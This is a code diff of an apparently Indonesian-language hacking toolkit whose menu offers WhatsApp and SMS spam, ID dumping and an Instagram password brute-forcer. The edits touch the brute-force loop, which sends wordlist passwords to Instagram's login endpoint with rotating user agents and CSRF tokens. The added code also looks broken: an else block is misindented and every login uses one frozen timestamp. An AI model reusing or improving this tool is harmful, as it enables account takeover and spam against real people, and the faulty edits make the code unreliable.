@@ -3,6 +3,8 @@
 
 
 #Import Importan
+import argparse
+import datetime
 import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid
 from time import sleep
 from rich import pretty
@@ -30,6 +32,7 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as DemonLord27 
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
 #Ngecheck Module
+waktu = datetime.datetime.now()
 try:
         import rich
 except ImportError:
@@ -393,7 +396,7 @@ def menu(my_name,my_id):
 		spam_wa()
 	elif _____demonlord___27____ in ['sms','SMS','Sms']:
 		spam_sms()
-	elif _____demonlord___27____ in ['intsa','instagram','INSTA', 'INSTAGRAM','Insta','Insta']:
+	elif _____demonlord___27____ in ['insta','instagram','INSTA', 'INSTAGRAM','Insta','Insta']:
 		insta()
 	elif _____demonlord___27____ in ['dump id','dump','Dump ID','Dump Id','DUMP ID']:
 		dumpid()
@@ -2564,17 +2567,6 @@ class sxp_wa:
 #===================================[Instagram]=====================================================
 
 
-import requests
-import sys
-import argparse
-import datetime
-import json
-import random
-import time
-import socket
-import os
-
-
 def get_user_agent():
     user_agent_list = '''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
 Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
@@ -2930,20 +2922,17 @@ def insta():
     printit('\n[#] Starting the brute force...\n', coledt=[1, 49, 91])
 
     # print start time for calculating total time taken
-    start_time = datetime.datetime.now()
-    if verbose: printit(f'[+] Started @ {start_time.strftime("%I:%M:%S %p")}\n', coledt=[1, 49, 93])
 
     # printing timeout, if changed from default
     if verbose and timeout != 2: printit(f'[+] Time delay between each attempt: {timeout} secs\n', coledt=[1, 49, 93])
 
     # Display verbose information about failed attempts
     if not verbose: printit('[!] To display failed attempts, use -v or --verbose', coledt=[1, 49, 93])
-    
     # Starting password brute forcing loop
     for password in wordlist:
         # Request data
         login_url = 'https://www.instagram.com/accounts/login/ajax/'
-        login_time = int(datetime.datetime.now().timestamp())
+        login_time = int(waktu.timestamp())
         password = password.strip()
         user_agent = get_user_agent()
         csrf_token = get_csrf_token()
@@ -3044,12 +3033,14 @@ def insta():
         time.sleep(timeout)
 
     # print end time for calculating total time taken
-    end_time = datetime.datetime.now()
-    if verbose: printit(f'\n\n[+] Ended @ {end_time.strftime("%I:%M:%S %p")}', coledt=[1, 49, 93])
+    if verbose: printit(f'\n\n[+] Crack Berhenti Di Jam{waktu.strftime("%I:%M:%S %p")}', coledt=[1, 49, 93])
 
-    # Calculating the total time taken
-    printit(f'\n[+] Brute force completed in: {end_time - start_time} (H:M:S)', coledt=[1, 49, 91], line_down=True)
+    _lanjut_ = input(' [+] Pilih Coy :  ')
+    if _lanjut_ in ['y','Y']:
+	   		login()
 
+	else:
+		sys.exit()
 
 
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
